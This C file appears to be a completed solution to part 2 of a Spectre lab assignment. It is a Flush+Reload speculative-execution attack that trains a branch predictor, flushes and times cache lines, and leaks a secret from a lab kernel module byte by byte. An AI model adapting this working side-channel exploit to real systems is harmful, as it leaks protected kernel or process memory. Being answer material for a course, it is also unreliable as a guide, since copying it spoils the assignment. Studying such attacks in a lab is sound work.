/*
 * Exploiting Speculative Execution
 *
 * Part 2
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"

#define ATTEMPTS 300
#define THRESHOLD 90
#define TRAINING 196

/*
 * call_kernel_part2
 * Performs the COMMAND_PART2 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part2(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART2;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

static unsigned char leak_one_byte_part2(int kernel_fd, char *shared_memory, size_t offset) {
    int candidates[256] = {0};
    int access_times[256] = {0};

    // TRAIN
    for (int i = 0; i < TRAINING; i++) {
        call_kernel_part2(kernel_fd, shared_memory, 3);
    }

    // FLUSH
    for (int attempt = 0; attempt < ATTEMPTS; attempt++) { // ATTEMPTS defined above, can increase/decrease for fine tuning
        for (int i = 0; i < 256; i++) {
            clflush(&shared_memory[i * 4096]); // page table size 4096, loop goes through and flushes all pages
        }

        // VICTIM
        call_kernel_part2(kernel_fd, shared_memory, offset); // run victim process!!

        // RELOAD 
        for (int i = 0; i < 256; i++) {
            int mix_i = ((i * 167) + 13) & 255; // mixed order to counter prefetching optimization
            uint64_t dt = time_access(&shared_memory[mix_i * 4096]); // measure access time to mix_i-th page
            access_times[mix_i] = dt;
            if (dt < THRESHOLD) {
                candidates[mix_i]++;
            }
        }
    }
    
    // find candidate for fastest access time, meaning victim accessed it
    int best = 0;
    for (int i = 1; i < 256; i++) {
        if (candidates[i] > candidates[best]) {
            best = i;
        }
    }
    return (unsigned char)best;
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;

        // [Part 2]- Fill this in!

        leaked_byte = (char)leak_one_byte_part2(kernel_fd, shared_memory, current_offset);
        leaked_str[current_offset] = leaked_byte;

        if (leaked_byte == '\x00') {
            printf("\nBroke at offset: %ld\n", current_offset);
            break;
        }
    }

    printf("\n\n[Part 2] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
